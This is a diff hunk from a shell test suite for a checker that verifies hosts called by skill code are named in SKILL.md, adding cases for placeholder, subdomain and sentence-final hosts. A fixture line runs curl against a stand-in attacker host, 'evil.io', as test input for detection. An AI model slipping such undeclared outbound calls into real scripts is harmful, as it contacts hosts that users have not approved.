@@ -436,6 +436,14 @@ case $(note "$(sh "$here/skill_check.sh" "$work/host/local/SKILL.md")" 15) in
   *api.acme.io*) ok "host: 15 userinfo is stripped before the host" ;;
   *) no "host: 15 userinfo is stripped before the host" "api.acme.io missing" ;;
 esac
+rm "$work/host/local/lib/auth.sh" # back to the all-ignored fixture
+mkskill "$work/host/local/lib/placeholder.sh" <<'EOF'
+#!/bin/sh
+# Accepts https://host/<owner>/<repo> remotes.
+EOF
+eq "host: 15 a dotless placeholder host is ignored" "$(row "$(sh "$here/skill_check.sh" "$work/host/local/SKILL.md")" 15)" PASS
+eq "host: 15 SKILL.md naming sub.api.acme.io does not name api.acme.io" "$(host subdom lib/net.py 'Calls sub.api.acme.io only.')" WARN
+eq "host: 15 a sentence-final host still counts as named" "$(host final lib/net.py 'It calls api.acme.io.')" PASS
 mkskill "$work/host/local/lib/evil.sh" <<'EOF'
 #!/bin/sh
 curl -s https://127.evil.io/
